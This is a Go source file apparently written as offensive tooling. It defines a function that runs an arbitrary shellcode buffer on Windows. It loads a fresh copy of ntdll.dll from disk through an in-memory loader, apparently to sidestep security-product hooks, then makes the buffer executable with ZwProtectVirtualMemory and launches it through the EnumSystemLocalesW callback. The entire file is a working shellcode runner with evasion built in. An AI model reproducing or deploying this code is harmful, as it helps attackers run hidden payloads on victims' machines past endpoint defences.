package Inyect

import (
	"github.com/Binject/universal"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"unsafe"
)

var (
	kernel32           = windows.NewLazySystemDLL("kernel32")
	EnumSystemLocalesW = kernel32.NewProc("EnumSystemLocalesW")
)

const (
	PAGE_EXECUTE uintptr = 0x10
)

func Inyect3xplo(buf []byte) {
	var Cargarlantdlllocalmente []byte
	var err error
	Cargarlantdlllocalmente, err = ioutil.ReadFile("C:\\Windows\\System32\\ntdll.dll")
	Puntero := func() {}
	var hProcess uintptr = 0
	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
	var dwBufferLen = uint(len(buf))
	var dwOldPerm uint32
	ntdll_loader, err := universal.NewLoader()
	ntdll_library, err := ntdll_loader.LoadLibrary("main", &Cargarlantdlllocalmente)

	if err != nil {
		log.Fatal(err)
	}
	_, err = ntdll_library.Call("ZwProtectVirtualMemory", hProcess-1,
		uintptr(unsafe.Pointer(&pBaseAddr)),
		uintptr(unsafe.Pointer(&dwBufferLen)),
		PAGE_EXECUTE,
		uintptr(unsafe.Pointer(&dwOldPerm)))

	//syscall.Syscall(uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0, 0)

	Puntero()
	EnumSystemLocalesW.Call(uintptr(unsafe.Pointer(&buf[0])))

}
